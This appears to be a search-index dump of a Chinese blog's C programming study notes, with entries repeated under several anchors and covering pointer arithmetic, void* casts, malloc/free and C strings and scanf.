这并没有改变p所指的变量的类型，而是让后人用不同的眼光通过p看他所指的变量 用指针来做什么 需要传入较大的数据用作参数 传入数组后对数组做操作 函数返回不止一个结果 需要用函数来修改不止一个变量 动态申请的内存…. ","date":"2023-11-17","objectID":"/c_language_notes/:9:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#0地址"},{"categories":["Programing"],"content":"\r9.2指针运算指针地址+1实际上是加一个sizeof() 给一个指针加1表示要让指针指向下一个变量 int a[10] ; int *p = a ; *(p+1) ---\u003e a[1] 如果指针不是指向一片连续分配的空间(如数组)，则这种运算没有意义 指针计算这些算术运算可以对指针做： 给指针加减一个整数 递增递减(++/–) 两个指针相减 指针减法的含义是，表示两个指针之间含有几个sizeof() *p++ 取出p所指的那个数据，之后把p移动到下一个位置去 *优先级比++低 常用于数组类的连续空间操作 在某些CPU上，这可以直接被翻译成一条汇编指令 指针比较\u003c,\u003c=,==,\u003e,\u003e=,!=都可以对指针做 比较它们在内存中的地址 数组中的单元的地址肯定是线性递增的 0地址0地址通常是不能随便碰的地址 可以用0地址来表示特殊的事情 返回的指针是无效的 指针没有被真正初始化 NULL是一个预定定义的符号，表示0地址 有的编译器不希望用0表示0地址 指针的类型无论指向什么类型，所有的指针大小都是一样的(因为都是地址) 但是指向不同类型的指针是不能直接互相赋值的(为了避免用错指针) 指针的类型转换void* 表示不知道只想什么东西的指针 计算时与char*相同(但不相通) 指针也可以转换类型 int *p = \u0026i ; void *q = (void*)p ; 这并没有改变p所指的变量的类型，而是让后人用不同的眼光通过p看他所指的变量 用指针来做什么 需要传入较大的数据用作参数 传入数组后对数组做操作 函数返回不止一个结果 需要用函数来修改不止一个变量 动态申请的内存…. ","date":"2023-11-17","objectID":"/c_language_notes/:9:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#指针的类型"},{"categories":["Programing"],"content":"\r9.2指针运算指针地址+1实际上是加一个sizeof() 给一个指针加1表示要让指针指向下一个变量 int a[10] ; int *p = a ; *(p+1) ---\u003e a[1] 如果指针不是指向一片连续分配的空间(如数组)，则这种运算没有意义 指针计算这些算术运算可以对指针做： 给指针加减一个整数 递增递减(++/–) 两个指针相减 指针减法的含义是，表示两个指针之间含有几个sizeof() *p++ 取出p所指的那个数据，之后把p移动到下一个位置去 *优先级比++低 常用于数组类的连续空间操作 在某些CPU上，这可以直接被翻译成一条汇编指令 指针比较\u003c,\u003c=,==,\u003e,\u003e=,!=都可以对指针做 比较它们在内存中的地址 数组中的单元的地址肯定是线性递增的 0地址0地址通常是不能随便碰的地址 可以用0地址来表示特殊的事情 返回的指针是无效的 指针没有被真正初始化 NULL是一个预定定义的符号，表示0地址 有的编译器不希望用0表示0地址 指针的类型无论指向什么类型，所有的指针大小都是一样的(因为都是地址) 但是指向不同类型的指针是不能直接互相赋值的(为了避免用错指针) 指针的类型转换void* 表示不知道只想什么东西的指针 计算时与char*相同(但不相通) 指针也可以转换类型 int *p = \u0026i ; void *q = (void*)p ; 这并没有改变p所指的变量的类型，而是让后人用不同的眼光通过p看他所指的变量 用指针来做什么 需要传入较大的数据用作参数 传入数组后对数组做操作 函数返回不止一个结果 需要用函数来修改不止一个变量 动态申请的内存…. ","date":"2023-11-17","objectID":"/c_language_notes/:9:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#指针的类型转换"},{"categories":["Programing"],"content":"\r9.2指针运算指针地址+1实际上是加一个sizeof() 给一个指针加1表示要让指针指向下一个变量 int a[10] ; int *p = a ; *(p+1) ---\u003e a[1] 如果指针不是指向一片连续分配的空间(如数组)，则这种运算没有意义 指针计算这些算术运算可以对指针做： 给指针加减一个整数 递增递减(++/–) 两个指针相减 指针减法的含义是，表示两个指针之间含有几个sizeof() *p++ 取出p所指的那个数据，之后把p移动到下一个位置去 *优先级比++低 常用于数组类的连续空间操作 在某些CPU上，这可以直接被翻译成一条汇编指令 指针比较\u003c,\u003c=,==,\u003e,\u003e=,!=都可以对指针做 比较它们在内存中的地址 数组中的单元的地址肯定是线性递增的 0地址0地址通常是不能随便碰的地址 可以用0地址来表示特殊的事情 返回的指针是无效的 指针没有被真正初始化 NULL是一个预定定义的符号，表示0地址 有的编译器不希望用0表示0地址 指针的类型无论指向什么类型，所有的指针大小都是一样的(因为都是地址) 但是指向不同类型的指针是不能直接互相赋值的(为了避免用错指针) 指针的类型转换void* 表示不知道只想什么东西的指针 计算时与char*相同(但不相通) 指针也可以转换类型 int *p = \u0026i ; void *q = (void*)p ; 这并没有改变p所指的变量的类型，而是让后人用不同的眼光通过p看他所指的变量 用指针来做什么 需要传入较大的数据用作参数 传入数组后对数组做操作 函数返回不止一个结果 需要用函数来修改不止一个变量 动态申请的内存…. ","date":"2023-11-17","objectID":"/c_language_notes/:9:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#用指针来做什么"},{"categories":["Programing"],"content":"\r动态内存的分配\rmalloc就是向系统申请内存 #include\u003cstdlib.h\u003e void* malloc(size_t size) ; 向malloc申请的空间的大小是以字节为单位的 返回的结果是void*，需要类型转换为自己需要的类型 (int*)malloc(n*sizeof(int)) 如果没空间了如果申请失败则返回0，或者叫做NULL #include \u003cstdio.h\u003e #include\u003cstdlib.h\u003e int main(void) { void *p; int cnt = 0; while ((p = malloc(100 * 1024 * 1024))) { cnt++; } printf(\"分配了%d00MB的空间\", cnt); return 0; } 查看系统最多能给分配多少内存(不要轻易尝试，容易卡死) free()与malloc配套的函数，把申请的空间还给系统 只能还申请阿里的空间的首地址 常见问题申请了没free—-\u003e长时间运行内存逐渐下降(内存垃圾堆积) ","date":"2023-11-17","objectID":"/c_language_notes/:9:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#动态内存的分配"},{"categories":["Programing"],"content":"\r动态内存的分配\rmalloc就是向系统申请内存 #include void* malloc(size_t size) ; 向malloc申请的空间的大小是以字节为单位的 返回的结果是void*，需要类型转换为自己需要的类型 (int*)malloc(n*sizeof(int)) 如果没空间了如果申请失败则返回0，或者叫做NULL #include #include int main(void) { void *p; int cnt = 0; while ((p = malloc(100 * 1024 * 1024))) { cnt++; } printf(\"分配了%d00MB的空间\", cnt); return 0; } 查看系统最多能给分配多少内存(不要轻易尝试，容易卡死) free()与malloc配套的函数，把申请的空间还给系统 只能还申请阿里的空间的首地址 常见问题申请了没free—-\u003e长时间运行内存逐渐下降(内存垃圾堆积) ","date":"2023-11-17","objectID":"/c_language_notes/:9:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#malloc"},{"categories":["Programing"],"content":"\r动态内存的分配\rmalloc就是向系统申请内存 #include void* malloc(size_t size) ; 向malloc申请的空间的大小是以字节为单位的 返回的结果是void*，需要类型转换为自己需要的类型 (int*)malloc(n*sizeof(int)) 如果没空间了如果申请失败则返回0，或者叫做NULL #include #include int main(void) { void *p; int cnt = 0; while ((p = malloc(100 * 1024 * 1024))) { cnt++; } printf(\"分配了%d00MB的空间\", cnt); return 0; } 查看系统最多能给分配多少内存(不要轻易尝试，容易卡死) free()与malloc配套的函数，把申请的空间还给系统 只能还申请阿里的空间的首地址 常见问题申请了没free—-\u003e长时间运行内存逐渐下降(内存垃圾堆积) ","date":"2023-11-17","objectID":"/c_language_notes/:9:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#如果没空间了"},{"categories":["Programing"],"content":"\r动态内存的分配\rmalloc就是向系统申请内存 #include void* malloc(size_t size) ; 向malloc申请的空间的大小是以字节为单位的 返回的结果是void*，需要类型转换为自己需要的类型 (int*)malloc(n*sizeof(int)) 如果没空间了如果申请失败则返回0，或者叫做NULL #include #include int main(void) { void *p; int cnt = 0; while ((p = malloc(100 * 1024 * 1024))) { cnt++; } printf(\"分配了%d00MB的空间\", cnt); return 0; } 查看系统最多能给分配多少内存(不要轻易尝试，容易卡死) free()与malloc配套的函数，把申请的空间还给系统 只能还申请阿里的空间的首地址 常见问题申请了没free—-\u003e长时间运行内存逐渐下降(内存垃圾堆积) ","date":"2023-11-17","objectID":"/c_language_notes/:9:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#free"},{"categories":["Programing"],"content":"\r动态内存的分配\rmalloc就是向系统申请内存 #include void* malloc(size_t size) ; 向malloc申请的空间的大小是以字节为单位的 返回的结果是void*，需要类型转换为自己需要的类型 (int*)malloc(n*sizeof(int)) 如果没空间了如果申请失败则返回0，或者叫做NULL #include #include int main(void) { void *p; int cnt = 0; while ((p = malloc(100 * 1024 * 1024))) { cnt++; } printf(\"分配了%d00MB的空间\", cnt); return 0; } 查看系统最多能给分配多少内存(不要轻易尝试，容易卡死) free()与malloc配套的函数，把申请的空间还给系统 只能还申请阿里的空间的首地址 常见问题申请了没free—-\u003e长时间运行内存逐渐下降(内存垃圾堆积) ","date":"2023-11-17","objectID":"/c_language_notes/:9:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#常见问题"},{"categories":["Programing"],"content":"\r10.1字符串\r字符数组\r以整数0结尾的一串字符 0或’\\0’是一样的，但是和'0’不同 0标志字符串的结束，但它不是字符串的一部分| 计算字符串长度的时候不包含这个0 字符串以数组的形式存在，以数组或指针的形式访问 更多的是以指针的形式 string.h里有很多处理字符串的函数 字符串变量 char *str = \"Hello\" ; char word[] = \"Hello\" ; char line[10] = \"Hello\" ; 字符串常量 “Hello” “Hello\"会被编译器变成一个字符数组放在某处，这个数组的长度是6，结尾还有表示结束的0 两个相邻的字符串常量会被自动连接起来 char* s = \"hello,world.\"; s是一个指针，初始化为指向一个字符串常量 这个常量所在的地方只能读不能写，所以实际上s是const char* s，但是由于历史的原因，编译器接受不带const的写法 试图对s所指的字符串做写入会导致严重的后果 如果需要修改字符串，应该用数组：char s[] = \"Hello,world!\"; 字符串 C语言的字符串是以字符数组的形态存在的 不能用运算符对字符串做运算 通过数组的方式可以遍历字符串 唯一特殊的地方是字符串字面量可以用来初始化字符数组 标准库提供了一些列字符串函数 构造字符串，用指针还是数组数组：这个字符串在这里，作文本地变量空间自动被收回 指针：这个字符串不知道在哪里(处理参数，动态分配空间) 也就是说， 如果要构造字符串—-\u003e数组 如果要处理字符串—-\u003e指针 char*是字符串？不对，字符串可以表达为char*形式，但char*不一定是字符串 本意是指向字符串的指针，可能指向的是字符的数组(就像int*一样) 只有它所指的字符串数组有结尾的0，才能说它所指的是字符串 字符串输入输出 char string[8]; scanf(\"%s,string\"); printf(\"%s\",string); scanf读入一个单词(到空格、tab或回车为止) scanf是不安全的，其不限制读入的长度 安全的输入 char string[8]; scanf(\"%7s\",string); ​ 在%和s之间的数字表示最多允许读入的字符的数量，这个数字应该比数组的大小小一 常见错误 char *string; scanf(\"%s\",string); 以为char*是字符串类型，定义了一个字符串类型的变量string就可以直接使用了 由于没有对string初始化为0，所以不一定每一运行都出错 空字符串 char buffer[100]=\"\"; 这是一个空的字符串，buffer[0] == '\\0' char buffer[] = \"\"; 这个数组的长度只有1 字符串数组 char **a a是一个指针，指向另一个指针 char a[][] 程序参数 int main(int argc,char const *argv[]) argv[0]是命令本身 当使用Unix的符号链接时，反应符号链接的名字 ","date":"2023-11-17","objectID":"/c_language_notes/:10:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#101字符串"},{"categories":["Programing"],"content":"\r10.1字符串\r字符数组\r以整数0结尾的一串字符 0或’\\0’是一样的，但是和'0’不同 0标志字符串的结束，但它不是字符串的一部分| 计算字符串长度的时候不包含这个0 字符串以数组的形式存在，以数组或指针的形式访问 更多的是以指针的形式 string.h里有很多处理字符串的函数 字符串变量 char *str = \"Hello\" ; char word[] = \"Hello\" ; char line[10] = \"Hello\" ; 字符串常量 “Hello” “Hello\"会被编译器变成一个字符数组放在某处，这个数组的长度是6，结尾还有表示结束的0 两个相邻的字符串常量会被自动连接起来 char* s = \"hello,world.\"; s是一个指针，初始化为指向一个字符串常量 这个常量所在的地方只能读不能写，所以实际上s是const char* s，但是由于历史的原因，编译器接受不带const的写法 试图对s所指的字符串做写入会导致严重的后果 如果需要修改字符串，应该用数组：char s[] = \"Hello,world!\"; 字符串 C语言的字符串是以字符数组的形态存在的 不能用运算符对字符串做运算 通过数组的方式可以遍历字符串 唯一特殊的地方是字符串字面量可以用来初始化字符数组 标准库提供了一些列字符串函数 构造字符串，用指针还是数组数组：这个字符串在这里，作文本地变量空间自动被收回 指针：这个字符串不知道在哪里(处理参数，动态分配空间) 也就是说， 如果要构造字符串—-\u003e数组 如果要处理字符串—-\u003e指针 char*是字符串？不对，字符串可以表达为char*形式，但char*不一定是字符串 本意是指向字符串的指针，可能指向的是字符的数组(就像int*一样) 只有它所指的字符串数组有结尾的0，才能说它所指的是字符串 字符串输入输出 char string[8]; scanf(\"%s,string\"); printf(\"%s\",string); scanf读入一个单词(到空格、tab或回车为止) scanf是不安全的，其不限制读入的长度 安全的输入 char string[8]; scanf(\"%7s\",string); ​ 在%和s之间的数字表示最多允许读入的字符的数量，这个数字应该比数组的大小小一 常见错误 char *string; scanf(\"%s\",string); 以为char*是字符串类型，定义了一个字符串类型的变量string就可以直接使用了 由于没有对string初始化为0，所以不一定每一运行都出错 空字符串 char buffer[100]=\"\"; 这是一个空的字符串，buffer[0] == '\\0' char buffer[] = \"\"; 这个数组的长度只有1 字符串数组 char **a a是一个指针，指向另一个指针 char a[][] 程序参数 int main(int argc,char const *argv[]) argv[0]是命令本身 当使用Unix的符号链接时，反应符号链接的名字 ","date":"2023-11-17","objectID":"/c_language_notes/:10:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#字符数组"},{"categories":["Programing"],"content":"\r10.1字符串\r字符数组\r以整数0结尾的一串字符 0或’\\0’是一样的，但是和'0’不同 0标志字符串的结束，但它不是字符串的一部分| 计算字符串长度的时候不包含这个0 字符串以数组的形式存在，以数组或指针的形式访问 更多的是以指针的形式 string.h里有很多处理字符串的函数 字符串变量 char *str = \"Hello\" ; char word[] = \"Hello\" ; char line[10] = \"Hello\" ; 字符串常量 “Hello” “Hello\"会被编译器变成一个字符数组放在某处，这个数组的长度是6，结尾还有表示结束的0 两个相邻的字符串常量会被自动连接起来 char* s = \"hello,world.\"; s是一个指针，初始化为指向一个字符串常量 这个常量所在的地方只能读不能写，所以实际上s是const char* s，但是由于历史的原因，编译器接受不带const的写法 试图对s所指的字符串做写入会导致严重的后果 如果需要修改字符串，应该用数组：char s[] = \"Hello,world!\"; 字符串 C语言的字符串是以字符数组的形态存在的 不能用运算符对字符串做运算 通过数组的方式可以遍历字符串 唯一特殊的地方是字符串字面量可以用来初始化字符数组 标准库提供了一些列字符串函数 构造字符串，用指针还是数组数组：这个字符串在这里，作文本地变量空间自动被收回 指针：这个字符串不知道在哪里(处理参数，动态分配空间) 也就是说， 如果要构造字符串—-\u003e数组 如果要处理字符串—-\u003e指针 char*是字符串？不对，字符串可以表达为char*形式，但char*不一定是字符串 本意是指向字符串的指针，可能指向的是字符的数组(就像int*一样) 只有它所指的字符串数组有结尾的0，才能说它所指的是字符串 字符串输入输出 char string[8]; scanf(\"%s,string\"); printf(\"%s\",string); scanf读入一个单词(到空格、tab或回车为止) scanf是不安全的，其不限制读入的长度 安全的输入 char string[8]; scanf(\"%7s\",string); ​ 在%和s之间的数字表示最多允许读入的字符的数量，这个数字应该比数组的大小小一 常见错误 char *string; scanf(\"%s\",string); 以为char*是字符串类型，定义了一个字符串类型的变量string就可以直接使用了 由于没有对string初始化为0，所以不一定每一运行都出错 空字符串 char buffer[100]=\"\"; 这是一个空的字符串，buffer[0] == '\\0' char buffer[] = \"\"; 这个数组的长度只有1 字符串数组 char **a a是一个指针，指向另一个指针 char a[][] 程序参数 int main(int argc,char const *argv[]) argv[0]是命令本身 当使用Unix的符号链接时，反应符号链接的名字 ","date":"2023-11-17","objectID":"/c_language_notes/:10:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#字符串变量"},{"categories":["Programing"],"content":"\r10.1字符串\r字符数组\r以整数0结尾的一串字符 0或’\\0’是一样的，但是和'0’不同 0标志字符串的结束，但它不是字符串的一部分| 计算字符串长度的时候不包含这个0 字符串以数组的形式存在，以数组或指针的形式访问 更多的是以指针的形式 string.h里有很多处理字符串的函数 字符串变量 char *str = \"Hello\" ; char word[] = \"Hello\" ; char line[10] = \"Hello\" ; 字符串常量 “Hello” “Hello\"会被编译器变成一个字符数组放在某处，这个数组的长度是6，结尾还有表示结束的0 两个相邻的字符串常量会被自动连接起来 char* s = \"hello,world.\"; s是一个指针，初始化为指向一个字符串常量 这个常量所在的地方只能读不能写，所以实际上s是const char* s，但是由于历史的原因，编译器接受不带const的写法 试图对s所指的字符串做写入会导致严重的后果 如果需要修改字符串，应该用数组：char s[] = \"Hello,world!\"; 字符串 C语言的字符串是以字符数组的形态存在的 不能用运算符对字符串做运算 通过数组的方式可以遍历字符串 唯一特殊的地方是字符串字面量可以用来初始化字符数组 标准库提供了一些列字符串函数 构造字符串，用指针还是数组数组：这个字符串在这里，作文本地变量空间自动被收回 指针：这个字符串不知道在哪里(处理参数，动态分配空间) 也就是说， 如果要构造字符串—-\u003e数组 如果要处理字符串—-\u003e指针 char*是字符串？不对，字符串可以表达为char*形式，但char*不一定是字符串 本意是指向字符串的指针，可能指向的是字符的数组(就像int*一样) 只有它所指的字符串数组有结尾的0，才能说它所指的是字符串 字符串输入输出 char string[8]; scanf(\"%s,string\"); printf(\"%s\",string); scanf读入一个单词(到空格、tab或回车为止) scanf是不安全的，其不限制读入的长度 安全的输入 char string[8]; scanf(\"%7s\",string); ​ 在%和s之间的数字表示最多允许读入的字符的数量，这个数字应该比数组的大小小一 常见错误 char *string; scanf(\"%s\",string); 以为char*是字符串类型，定义了一个字符串类型的变量string就可以直接使用了 由于没有对string初始化为0，所以不一定每一运行都出错 空字符串 char buffer[100]=\"\"; 这是一个空的字符串，buffer[0] == '\\0' char buffer[] = \"\"; 这个数组的长度只有1 字符串数组 char **a a是一个指针，指向另一个指针 char a[][] 程序参数 int main(int argc,char const *argv[]) argv[0]是命令本身 当使用Unix的符号链接时，反应符号链接的名字 ","date":"2023-11-17","objectID":"/c_language_notes/:10:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#字符串常量"},{"categories":["Programing"],"content":"\r10.1字符串\r字符数组\r以整数0结尾的一串字符 0或’\\0’是一样的，但是和'0’不同 0标志字符串的结束，但它不是字符串的一部分| 计算字符串长度的时候不包含这个0 字符串以数组的形式存在，以数组或指针的形式访问 更多的是以指针的形式 string.h里有很多处理字符串的函数 字符串变量 char *str = \"Hello\" ; char word[] = \"Hello\" ; char line[10] = \"Hello\" ; 字符串常量 “Hello” “Hello\"会被编译器变成一个字符数组放在某处，这个数组的长度是6，结尾还有表示结束的0 两个相邻的字符串常量会被自动连接起来 char* s = \"hello,world.\"; s是一个指针，初始化为指向一个字符串常量 这个常量所在的地方只能读不能写，所以实际上s是const char* s，但是由于历史的原因，编译器接受不带const的写法 试图对s所指的字符串做写入会导致严重的后果 如果需要修改字符串，应该用数组：char s[] = \"Hello,world!\"; 字符串 C语言的字符串是以字符数组的形态存在的 不能用运算符对字符串做运算 通过数组的方式可以遍历字符串 唯一特殊的地方是字符串字面量可以用来初始化字符数组 标准库提供了一些列字符串函数 构造字符串，用指针还是数组数组：这个字符串在这里，作文本地变量空间自动被收回 指针：这个字符串不知道在哪里(处理参数，动态分配空间) 也就是说， 如果要构造字符串—-\u003e数组 如果要处理字符串—-\u003e指针 char*是字符串？不对，字符串可以表达为char*形式，但char*不一定是字符串 本意是指向字符串的指针，可能指向的是字符的数组(就像int*一样) 只有它所指的字符串数组有结尾的0，才能说它所指的是字符串 字符串输入输出 char string[8]; scanf(\"%s,string\"); printf(\"%s\",string); scanf读入一个单词(到空格、tab或回车为止) scanf是不安全的，其不限制读入的长度 安全的输入 char string[8]; scanf(\"%7s\",string); ​ 在%和s之间的数字表示最多允许读入的字符的数量，这个数字应该比数组的大小小一 常见错误 char *string; scanf(\"%s\",string); 以为char*是字符串类型，定义了一个字符串类型的变量string就可以直接使用了 由于没有对string初始化为0，所以不一定每一运行都出错 空字符串 char buffer[100]=\"\"; 这是一个空的字符串，buffer[0] == '\\0' char buffer[] = \"\"; 这个数组的长度只有1 字符串数组 char **a a是一个指针，指向另一个指针 char a[][] 程序参数 int main(int argc,char const *argv[]) argv[0]是命令本身 当使用Unix的符号链接时，反应符号链接的名字 ","date":"2023-11-17","objectID":"/c_language_notes/:10:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#字符串"},{"categories":["Programing"],"content":"\r10.1字符串\r字符数组\r以整数0结尾的一串字符 0或’\\0’是一样的，但是和'0’不同 0标志字符串的结束，但它不是字符串的一部分| 计算字符串长度的时候不包含这个0 字符串以数组的形式存在，以数组或指针的形式访问 更多的是以指针的形式 string.h里有很多处理字符串的函数 字符串变量 char *str = \"Hello\" ; char word[] = \"Hello\" ; char line[10] = \"Hello\" ; 字符串常量 “Hello” “Hello\"会被编译器变成一个字符数组放在某处，这个数组的长度是6，结尾还有表示结束的0 两个相邻的字符串常量会被自动连接起来 char* s = \"hello,world.\"; s是一个指针，初始化为指向一个字符串常量 这个常量所在的地方只能读不能写，所以实际上s是const char* s，但是由于历史的原因，编译器接受不带const的写法 试图对s所指的字符串做写入会导致严重的后果 如果需要修改字符串，应该用数组：char s[] = \"Hello,world!\"; 字符串 C语言的字符串是以字符数组的形态存在的 不能用运算符对字符串做运算 通过数组的方式可以遍历字符串 唯一特殊的地方是字符串字面量可以用来初始化字符数组 标准库提供了一些列字符串函数 构造字符串，用指针还是数组数组：这个字符串在这里，作文本地变量空间自动被收回 指针：这个字符串不知道在哪里(处理参数，动态分配空间) 也就是说， 如果要构造字符串—-\u003e数组 如果要处理字符串—-\u003e指针 char*是字符串？不对，字符串可以表达为char*形式，但char*不一定是字符串 本意是指向字符串的指针，可能指向的是字符的数组(就像int*一样) 只有它所指的字符串数组有结尾的0，才能说它所指的是字符串 字符串输入输出 char string[8]; scanf(\"%s,string\"); printf(\"%s\",string); scanf读入一个单词(到空格、tab或回车为止) scanf是不安全的，其不限制读入的长度 安全的输入 char string[8]; scanf(\"%7s\",string); ​ 在%和s之间的数字表示最多允许读入的字符的数量，这个数字应该比数组的大小小一 常见错误 char *string; scanf(\"%s\",string); 以为char*是字符串类型，定义了一个字符串类型的变量string就可以直接使用了 由于没有对string初始化为0，所以不一定每一运行都出错 空字符串 char buffer[100]=\"\"; 这是一个空的字符串，buffer[0] == '\\0' char buffer[] = \"\"; 这个数组的长度只有1 字符串数组 char **a a是一个指针，指向另一个指针 char a[][] 程序参数 int main(int argc,char const *argv[]) argv[0]是命令本身 当使用Unix的符号链接时，反应符号链接的名字 ","date":"2023-11-17","objectID":"/c_language_notes/:10:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#构造字符串用指针还是数组"},{"categories":["Programing"],"content":"\r10.1字符串\r字符数组\r以整数0结尾的一串字符 0或’\\0’是一样的，但是和'0’不同 0标志字符串的结束，但它不是字符串的一部分| 计算字符串长度的时候不包含这个0 字符串以数组的形式存在，以数组或指针的形式访问 更多的是以指针的形式 string.h里有很多处理字符串的函数 字符串变量 char *str = \"Hello\" ; char word[] = \"Hello\" ; char line[10] = \"Hello\" ; 字符串常量 “Hello” “Hello\"会被编译器变成一个字符数组放在某处，这个数组的长度是6，结尾还有表示结束的0 两个相邻的字符串常量会被自动连接起来 char* s = \"hello,world.\"; s是一个指针，初始化为指向一个字符串常量 这个常量所在的地方只能读不能写，所以实际上s是const char* s，但是由于历史的原因，编译器接受不带const的写法 试图对s所指的字符串做写入会导致严重的后果 如果需要修改字符串，应该用数组：char s[] = \"Hello,world!\"; 字符串 C语言的字符串是以字符数组的形态存在的 不能用运算符对字符串做运算 通过数组的方式可以遍历字符串 唯一特殊的地方是字符串字面量可以用来初始化字符数组 标准库提供了一些列字符串函数 构造字符串，用指针还是数组数组：这个字符串在这里，作文本地变量空间自动被收回 指针：这个字符串不知道在哪里(处理参数，动态分配空间) 也就是说， 如果要构造字符串—-\u003e数组 如果要处理字符串—-\u003e指针 char*是字符串？不对，字符串可以表达为char*形式，但char*不一定是字符串 本意是指向字符串的指针，可能指向的是字符的数组(就像int*一样) 只有它所指的字符串数组有结尾的0，才能说它所指的是字符串 字符串输入输出 char string[8]; scanf(\"%s,string\"); printf(\"%s\",string); scanf读入一个单词(到空格、tab或回车为止) scanf是不安全的，其不限制读入的长度 安全的输入 char string[8]; scanf(\"%7s\",string); ​ 在%和s之间的数字表示最多允许读入的字符的数量，这个数字应该比数组的大小小一 常见错误 char *string; scanf(\"%s\",string); 以为char*是字符串类型，定义了一个字符串类型的变量string就可以直接使用了 由于没有对string初始化为0，所以不一定每一运行都出错 空字符串 char buffer[100]=\"\"; 这是一个空的字符串，buffer[0] == '\\0' char buffer[] = \"\"; 这个数组的长度只有1 字符串数组 char **a a是一个指针，指向另一个指针 char a[][] 程序参数 int main(int argc,char const *argv[]) argv[0]是命令本身 当使用Unix的符号链接时，反应符号链接的名字 ","date":"2023-11-17","objectID":"/c_language_notes/:10:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#char是字符串"},{"categories":["Programing"],"content":"\r10.1字符串\r字符数组\r以整数0结尾的一串字符 0或’\\0’是一样的，但是和'0’不同 0标志字符串的结束，但它不是字符串的一部分| 计算字符串长度的时候不包含这个0 字符串以数组的形式存在，以数组或指针的形式访问 更多的是以指针的形式 string.h里有很多处理字符串的函数 字符串变量 char *str = \"Hello\" ; char word[] = \"Hello\" ; char line[10] = \"Hello\" ; 字符串常量 “Hello” “Hello\"会被编译器变成一个字符数组放在某处，这个数组的长度是6，结尾还有表示结束的0 两个相邻的字符串常量会被自动连接起来 char* s = \"hello,world.\"; s是一个指针，初始化为指向一个字符串常量 这个常量所在的地方只能读不能写，所以实际上s是const char* s，但是由于历史的原因，编译器接受不带const的写法 试图对s所指的字符串做写入会导致严重的后果 如果需要修改字符串，应该用数组：char s[] = \"Hello,world!\"; 字符串 C语言的字符串是以字符数组的形态存在的 不能用运算符对字符串做运算 通过数组的方式可以遍历字符串 唯一特殊的地方是字符串字面量可以用来初始化字符数组 标准库提供了一些列字符串函数 构造字符串，用指针还是数组数组：这个字符串在这里，作文本地变量空间自动被收回 指针：这个字符串不知道在哪里(处理参数，动态分配空间) 也就是说， 如果要构造字符串—-\u003e数组 如果要处理字符串—-\u003e指针 char*是字符串？不对，字符串可以表达为char*形式，但char*不一定是字符串 本意是指向字符串的指针，可能指向的是字符的数组(就像int*一样) 只有它所指的字符串数组有结尾的0，才能说它所指的是字符串 字符串输入输出 char string[8]; scanf(\"%s,string\"); printf(\"%s\",string); scanf读入一个单词(到空格、tab或回车为止) scanf是不安全的，其不限制读入的长度 安全的输入 char string[8]; scanf(\"%7s\",string); ​ 在%和s之间的数字表示最多允许读入的字符的数量，这个数字应该比数组的大小小一 常见错误 char *string; scanf(\"%s\",string); 以为char*是字符串类型，定义了一个字符串类型的变量string就可以直接使用了 由于没有对string初始化为0，所以不一定每一运行都出错 空字符串 char buffer[100]=\"\"; 这是一个空的字符串，buffer[0] == '\\0' char buffer[] = \"\"; 这个数组的长度只有1 字符串数组 char **a a是一个指针，指向另一个指针 char a[][] 程序参数 int main(int argc,char const *argv[]) argv[0]是命令本身 当使用Unix的符号链接时，反应符号链接的名字 ","date":"2023-11-17","objectID":"/c_language_notes/:10:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#字符串输入输出"},{"categories":["Programing"],"content":"\r10.1字符串\r字符数组\r以整数0结尾的一串字符 0或’\\0’是一样的，但是和'0’不同 0标志字符串的结束，但它不是字符串的一部分| 计算字符串长度的时候不包含这个0 字符串以数组的形式存在，以数组或指针的形式访问 更多的是以指针的形式 string.h里有很多处理字符串的函数 字符串变量 char *str = \"Hello\" ; char word[] = \"Hello\" ; char line[10] = \"Hello\" ; 字符串常量 “Hello” “Hello\"会被编译器变成一个字符数组放在某处，这个数组的长度是6，结尾还有表示结束的0 两个相邻的字符串常量会被自动连接起来 char* s = \"hello,world.\"; s是一个指针，初始化为指向一个字符串常量 这个常量所在的地方只能读不能写，所以实际上s是const char* s，但是由于历史的原因，编译器接受不带const的写法 试图对s所指的字符串做写入会导致严重的后果 如果需要修改字符串，应该用数组：char s[] = \"Hello,world!\"; 字符串 C语言的字符串是以字符数组的形态存在的 不能用运算符对字符串做运算 通过数组的方式可以遍历字符串 唯一特殊的地方是字符串字面量可以用来初始化字符数组 标准库提供了一些列字符串函数 构造字符串，用指针还是数组数组：这个字符串在这里，作文本地变量空间自动被收回 指针：这个字符串不知道在哪里(处理参数，动态分配空间) 也就是说， 如果要构造字符串—-\u003e数组 如果要处理字符串—-\u003e指针 char*是字符串？不对，字符串可以表达为char*形式，但char*不一定是字符串 本意是指向字符串的指针，可能指向的是字符的数组(就像int*一样) 只有它所指的字符串数组有结尾的0，才能说它所指的是字符串 字符串输入输出 char string[8]; scanf(\"%s,string\"); printf(\"%s\",string); scanf读入一个单词(到空格、tab或回车为止) scanf是不安全的，其不限制读入的长度 安全的输入 char string[8]; scanf(\"%7s\",string); ​ 在%和s之间的数字表示最多允许读入的字符的数量，这个数字应该比数组的大小小一 常见错误 char *string; scanf(\"%s\",string); 以为char*是字符串类型，定义了一个字符串类型的变量string就可以直接使用了 由于没有对string初始化为0，所以不一定每一运行都出错 空字符串 char buffer[100]=\"\"; 这是一个空的字符串，buffer[0] == '\\0' char buffer[] = \"\"; 这个数组的长度只有1 字符串数组 char **a a是一个指针，指向另一个指针 char a[][] 程序参数 